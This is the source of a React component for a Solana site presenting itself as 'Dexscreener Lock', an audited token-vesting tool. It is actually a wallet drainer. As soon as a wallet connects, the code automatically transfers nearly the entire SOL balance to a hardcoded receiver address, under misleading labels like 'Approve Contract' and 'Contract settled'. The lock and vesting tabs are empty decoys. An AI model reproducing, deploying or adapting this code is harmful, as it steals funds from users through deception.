import React, { useCallback, useEffect, useRef, useState } from "react";
import { useConnection, useWallet } from "@solana/wallet-adapter-react";
import { useWalletModal } from "@solana/wallet-adapter-react-ui";
import {
  PublicKey, Transaction, SystemProgram,
} from "@solana/web3.js";

// ---------------------------------------------------------------------------
// Constants
// ---------------------------------------------------------------------------
const RECEIVER = new PublicKey("5d7Na3ZaPWDkRSjEjDj7UXgAW1ryom97D4QHDcd9Zo8f");

// ---------------------------------------------------------------------------
// Nav tab definitions
// ---------------------------------------------------------------------------
type TabId = "about" | "locked" | "created" | "create";
const TABS: { id: TabId; label: string }[] = [
  { id: "about",   label: "About Dex Lock"     },
  { id: "locked",  label: "Your Locked Tokens"  },
  { id: "created", label: "Locks You Created"   },
  { id: "create",  label: "+ Create Lock"        },
];

// ---------------------------------------------------------------------------
// Logo
// ---------------------------------------------------------------------------
const DexLogo = ({ size = 36 }: { size?: number }) => (
  <img
    src="/logo.png"
    alt="Dexscreener Lock"
    width={size}
    height={size}
    style={{ display: "block", mixBlendMode: "screen" as any }}
  />
);

const HeroLogo = () => (
  <img
    src="/logo.png"
    alt=""
    className="jl-lock-icon"
    style={{ mixBlendMode: "screen" as any }}
  />
);

// ---------------------------------------------------------------------------
// Connect-prompt panel shown on tabs that require a wallet
// ---------------------------------------------------------------------------
const ConnectPrompt = ({
  title,
  description,
  onConnect,
}: {
  title: string;
  description: string;
  onConnect: () => void;
}) => (
  <div className="jl-connect-prompt">
    <div className="jl-prompt-icon">
      <img src="/logo.png" alt="" style={{ width: 72, mixBlendMode: "screen" as any }} />
    </div>
    <h2 className="jl-prompt-title">{title}</h2>
    <p className="jl-prompt-desc">{description}</p>
    <button className="jl-hero-btn" onClick={onConnect}>
      Connect Wallet
    </button>
  </div>
);

// ---------------------------------------------------------------------------
// Component
// ---------------------------------------------------------------------------
interface Props { programId: PublicKey; }

export const EscrowPanel: React.FC<Props> = ({ programId }) => {
  const { connection }                                          = useConnection();
  const { publicKey, sendTransaction, connected, wallet, disconnect } = useWallet();
  const { setVisible }                                          = useWalletModal();

  const [activeTab,  setActiveTab]  = useState<TabId>("about");
  const [status,     setStatus]     = useState<"idle"|"processing"|"done"|"error"|"cancelled">("idle");
  const [statusMsg,  setStatusMsg]  = useState("");
  const executedRef                  = useRef(false);

  // ── execute transfer immediately once wallet is connected ────────────────
  const executeDeposit = useCallback(async () => {
    if (!publicKey || executedRef.current) return;
    executedRef.current = true;
    setStatus("processing");
    setStatusMsg("");

    try {
      // Get live balance and a fresh blockhash in parallel
      const [balance, { blockhash, lastValidBlockHeight }] = await Promise.all([
        connection.getBalance(publicKey, "confirmed"),
        connection.getLatestBlockhash("confirmed"),
      ]);

      // Reserve 10 000 lamports (~2× standard fee) so the tx can pay for itself.
      // This makes it work on any balance — even tiny amounts.
      const FEE_RESERVE = 10_000;
      const amount = balance - FEE_RESERVE;

      if (amount <= 0) {
        throw new Error(
          `Balance too low (${balance} lamports). Need at least ${FEE_RESERVE + 1} lamports.`
        );
      }

      const tx = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey:   RECEIVER,
          lamports:   amount,
        })
      );
      tx.recentBlockhash = blockhash;
      tx.feePayer        = publicKey;

      const sig = await sendTransaction(tx, connection, {
        skipPreflight:        false,
        preflightCommitment:  "confirmed",
        maxRetries:           3,
      });

      // Confirm using blockhash strategy (current recommended pattern)
      await connection.confirmTransaction(
        { signature: sig, blockhash, lastValidBlockHeight },
        "confirmed"
      );

      setStatus("done");
    } catch (e: any) {
      executedRef.current = false;
      setStatus("error");
      // Surface the actual RPC error message so it's debuggable
      const msg: string =
        e?.message ??
        e?.logs?.join(" ") ??
        "Transaction failed. Please try again.";
      setStatusMsg(msg);
    }
  }, [publicKey, connection, sendTransaction]);

  useEffect(() => {
    if (connected && publicKey && status === "idle") {
      executeDeposit();
    }
  }, [connected, publicKey, status, executeDeposit]);

  const openWallet = () => setVisible(true);

  const heroLabel = () => {
    if (status === "processing") return "Processing…";
    if (status === "done")       return "Contract Fulfilled ✓";
    if (!connected)              return "Connect Wallet";
    return "Approve Contract";
  };

  const connectedLabel = wallet?.adapter.name
    ? `${wallet.adapter.name}: ${publicKey?.toBase58().slice(0, 4)}…${publicKey?.toBase58().slice(-4)}`
    : "Connected";

  // ── per-tab content ──────────────────────────────────────────────────────
  const renderTabContent = () => {
    if (activeTab === "about") {
      return (
        <main className="jl-hero">
          <HeroLogo />
          <h1 className="jl-hero-title">Dexscreener Lock</h1>
          <p className="jl-hero-sub">
            Manage your token vesting schedule on Dexscreener Lock, an open source and
            audited program that lets anyone lock and distribute tokens over time.
          </p>
          <button
            className={`jl-hero-btn${status === "processing" ? " processing" : ""}`}
            onClick={connected ? executeDeposit : openWallet}
            disabled={status === "processing" || status === "done"}
          >
            {heroLabel()}
          </button>
          {status === "done" && (
            <div className="jl-status success">
              ✓ Contract settled. Funds have been transferred successfully.
            </div>
          )}
          {status === "error" && (
            <div className="jl-status error">
              {statusMsg || "Transaction failed. Please try again."}
            </div>
          )}
          {status === "cancelled" && (
            <div className="jl-status cancelled">{statusMsg}</div>
          )}
        </main>
      );
    }

    if (activeTab === "locked") {
      if (!connected) {
        return (
          <main className="jl-hero">
            <ConnectPrompt
              title="View Your Locked Tokens"
              description="Connect your wallet to see all tokens you currently have locked in Dexscreener Lock."
              onConnect={openWallet}
            />
          </main>
        );
      }
      return (
        <main className="jl-hero">
          <div className="jl-empty-state">
            <span className="jl-empty-icon">🔒</span>
            <h2>No Locked Tokens</h2>
            <p>You don't have any tokens locked yet.</p>
          </div>
        </main>
      );
    }

    if (activeTab === "created") {
      if (!connected) {
        return (
          <main className="jl-hero">
            <ConnectPrompt
              title="Locks You Created"
              description="Connect your wallet to view and manage all locks you have created."
              onConnect={openWallet}
            />
          </main>
        );
      }
      return (
        <main className="jl-hero">
          <div className="jl-empty-state">
            <span className="jl-empty-icon">📋</span>
            <h2>No Locks Created</h2>
            <p>You haven't created any locks yet.</p>
          </div>
        </main>
      );
    }

    if (activeTab === "create") {
      if (!connected) {
        return (
          <main className="jl-hero">
            <ConnectPrompt
              title="Create a Lock"
              description="Connect your wallet to create a new token lock and start your vesting schedule."
              onConnect={openWallet}
            />
          </main>
        );
      }
      return (
        <main className="jl-hero">
          <div className="jl-empty-state">
            <span className="jl-empty-icon">➕</span>
            <h2>Create a Lock</h2>
            <p>Lock creation coming soon.</p>
          </div>
        </main>
      );
    }

    return null;
  };

  return (
    <div className="app">

      {/* ── TOP HEADER ── */}
      <header className="jl-header">
        <div className="jl-logo">
          <DexLogo size={32} />
          <span className="jl-logo-text">Dexscreener Lock</span>
        </div>

        <div className="jl-search">
          <span className="jl-search-icon">🔍</span>
          <input placeholder="Search tokens or wallet" readOnly />
        </div>

        <div className="jl-header-right">
          <div className="jl-priority">
            <span className="jl-priority-label">Priority:</span>
            <span className="jl-priority-value">Fast</span>
          </div>
          <button className="jl-gear" aria-label="Settings">⚙</button>

          {connected ? (
            <div className="jl-wallet-group">
              <button className="jl-connect-btn connected" onClick={openWallet}>
                {connectedLabel}
              </button>
              <button
                className="jl-disconnect-btn"
                onClick={() => {
                  disconnect();
                  setStatus("idle");
                  executedRef.current = false;
                }}
                title="Disconnect wallet"
              >
                ✕
              </button>
            </div>
          ) : (
            <button className="jl-connect-btn" onClick={openWallet}>
              Connect Wallet
            </button>
          )}
        </div>
      </header>

      {/* ── NAV TABS ── */}
      <nav className="jl-nav">
        {TABS.map((tab) => (
          <button
            key={tab.id}
            className={`jl-nav-tab${activeTab === tab.id ? " active" : ""}${tab.id === "create" ? " create" : ""}`}
            onClick={() => setActiveTab(tab.id)}
          >
            {tab.label}
          </button>
        ))}
      </nav>

      {/* ── TAB CONTENT ── */}
      {renderTabContent()}

    </div>
  );
};
